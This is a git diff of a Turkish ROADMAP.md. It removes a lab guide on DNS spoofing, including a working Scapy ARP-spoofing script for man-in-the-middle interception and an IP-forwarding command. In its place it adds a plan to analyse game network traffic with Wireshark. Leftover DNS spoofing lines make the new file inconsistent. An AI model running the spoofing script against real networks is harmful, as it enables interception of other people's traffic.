@@ -1,58 +1,30 @@
 # ROADMAP.md: Python ile DNS Spoofing Özelliklerini Geliştirme ve Test Etme
 
-## Giriş
-Bu yol haritası, Kali Linux’ta bulunan DNS spoofing araçlarından (Ettercap, Dnsspoof, DNSChef, Bettercap, DDSpoof ve SET) esinlenerek, Python kullanılarak bu özelliklerin nasıl geliştirileceği ve test edileceğine dair detaylı bir rehber sunar. **Önemli Uyarı: Bu bilgiler yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımı yasa dışı ve etik dışıdır. Herhangi bir ağda veya sistemde test yapmadan önce açık izin almanız zorunludur.**
+## 1. Giriş
+Bu proje, Counter-Strike: Global Offensive (CS:GO), Valorant ve PlayerUnknown's Battlegrounds (PUBG) gibi popüler çevrimiçi oyunların ağ bağlantılarını derinlemesine incelemeyi hedeflemektedir. Ana amaç, bu oyunlar sırasında kullanılan IP adreslerini, sunucuları, portları ve protokolleri tespit etmektir. Elde edilen veriler, oyun güvenliği araştırmaları, ağ performans analizi ve potansiyel zafiyet tespiti için temel oluşturacaktır.**
 
 Bu rehber, DNS spoofing tekniklerini Python ile yeniden oluşturmayı, etik ve yasal sınırlar içinde kalarak kontrollü bir ortamda test etmeyi amaçlar.
 
-## Ön Koşullar
-- **Python 3.x**: Geliştirme için temel dil.
-- **Kütüphaneler**:
-  - Scapy: Paket oluşturma ve ağ manipülasyonu için (`pip install scapy`).
-  - dnslib: DNS sunucusu oluşturmak için (`pip install dnslib`).
-  - Flask: Sahte web sunucusu için (`pip install flask`).
-- **Bilgi Gereksinimleri**:
-  - Python programlama temelleri.
-  - Ağ protokolleri (IP, ARP, DNS, DHCP) hakkında temel bilgi.
-  - Linux komut satırı kullanımı.
-- **Araçlar**: VirtualBox veya benzeri bir sanallaştırma yazılımı.
+## 2. Proje Vizyonu
+** Projenin temel vizyonu, oyun ağ trafiği analizinde kapsamlı ve tekrarlanabilir bir metodoloji sunarak, araştırmacılar, güvenlik uzmanları ve oyun meraklıları için değerli bir kaynak olmaktır. Uzun vadede, bu projenin statik bir raporlama aracından, dinamik ve etkileşimli bir ağ analiz platformuna dönüşmesi hedeflenmektedir. Bu, sadece mevcut oyunları değil, gelecekteki çevrimiçi oyunları da analiz etmeye olanak tanıyan genişletilebilir bir yapıya sahip olacaktır. **
 
-## Test Ortamını Kurma
-Güvenli bir test ortamı oluşturmak için aşağıdaki adımları izleyin:
-1. **VirtualBox Kurulumu**: VirtualBox’ı indirin ve kurun.
-2. **Sanal Makineler (VM) Oluşturma**:
-   - **Saldırgan VM**: Kali Linux veya herhangi bir Linux dağıtımı.
-   - **Kurban VM**: Herhangi bir işletim sistemi (ör. Windows, Linux).
-3. **Ağ Yapılandırması**: VM’leri yalnızca dahili veya host-only bir ağda çalışacak şekilde ayarlayın. Bu, testlerin üretim ağlarından izole olmasını sağlar.
+## 3. Tamamlanan Kilometre Taşı: V1.0 - Temel Ağ Analizi ve Raporlama
+Bu aşama, projenin başlangıç hedeflerinin başarıyla tamamlandığı ilk temel sürümü temsil etmektedir.
+  **Hedefler:**:
+   - Seçilen popüler çevrimiçi oyunların (CS:GO, Valorant, PUBG) temel ağ bağlantı detaylarının (IP adresleri, portlar, kullanılan protokoller) tespiti ve belgelenmesi.
+   - Bulguların README.md dosyasında açık ve anlaşılır bir şekilde sunulması.
 
 ## Temel Bileşenlerin Geliştirilmesi
 
-### ARP Spoofing Betiği
-ARP spoofing, ortadaki adam (MITM) saldırıları için temel bir adımdır. Bu betik, saldırganın MAC adresini ağ geçidinin IP’siyle ilişkilendirmek için sahte ARP yanıtları gönderir.
+### Tamamlanan Görevler:
+  - Her bir hedef oyun için standart oyun senaryolarında (lobi, oyun içi, sunucu bağlantısı) Wireshark ile ağ trafiği yakalama süreçlerinin tanımlanması ve uygulanması.
+  - Oyun trafiğini etkili bir şekilde izole etmek ve analiz etmek için özel Wireshark Capture Filters ve Display Filters setlerinin oluşturulması ve test edilmesi.
+  - Yakalanan **.pcap** dosyaları üzerinde temel analizlerin yapılması ve kritik IP adresleri, port aralıkları ve ağ protokollerinin (UDP, TCP) belirlenmes
+  - Projenin amacını, hedeflerini, kurulum adımlarını ve ilk bulguları içeren kapsamlı bir README.md dosyasının hazırlanması.
+  - Tespit edilen IP/port/protokol bilgilerini özetleyen detaylı bir **"Oyun Ağ Bağlantıları Analiz Tablosu"**nun oluşturulması ve README.md'ye entegrasyonu.
+  - İlgili araştırma notları için researchs/ klasörü altında ilk taslak Markdown dosyalarının oluşturulması (örn. csgo_network_analysis.md, wireshark_filters.md).
 
-1. Scapy’yi kurun: `pip install scapy`
-2. IP yönlendirmeyi etkinleştirin: `sudo sysctl -w net.ipv4.ip_forward=1`
-3. ARP spoofing betiğini oluşturun:
 
-```python
-from scapy.all import *
-import time
-
-def get_mac(ip):
-    ans, _ = arping(ip)
-    for s, r in ans:
-        return r[Ether].src
-
-def arp_spoof(target_ip, gateway_ip):
-    target_mac = get_mac(target_ip)
-    gateway_mac = get_mac(gateway_ip)
-    while True:
-        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
-        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
-        time.sleep(2)
-
-# Kullanım
-arp_spoof('192.168.1.10', '192.168.1.1')  # hedef_ip, ağ_geçidi_ip
 ```
 
 ### DNS Spoofing Betiği
